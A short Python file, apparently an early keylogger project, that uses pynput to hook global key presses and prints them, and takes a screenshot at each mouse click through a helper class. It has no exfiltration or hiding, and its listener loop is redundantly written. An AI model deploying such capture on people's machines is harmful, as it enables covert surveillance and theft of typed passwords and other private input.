# keylogger.py

# test_keylogger.py
from pynput.keyboard import Key
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener

from .screen_capture import Screen_Capture

class Keylogger:
    def __init__(self):
        self.count = 0
        self.keys = []
        self.screen_capture = Screen_Capture()

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.screen_capture.take_screenshot(x, y)

    def on_press(self, key):
        print('{0} pressed'.format(
            key))

    def on_release(self, key):
        pass
        # print('{0} release'.format(
        #     key))
        # if key == Key.esc:
        #     # Stop listener
        #     return False

    def start_listening(self):
        # Collect events until released
        with KeyboardListener(on_press=self.on_press, on_release=self.on_release) as keyboard_listener, \
                MouseListener(on_click=self.on_click) as mouse_listener:
            while keyboard_listener.is_alive() and mouse_listener.is_alive():
                if not keyboard_listener.is_alive():
                    keyboard_listener.start()
                if not mouse_listener.is_alive():
                    mouse_listener.start()
        
        keyboard_listener.join()
        mouse_listener.join()
        # Call pynput.mouse.Listener.stop from anywhere, raise StopException or return False from a callback to stop the listener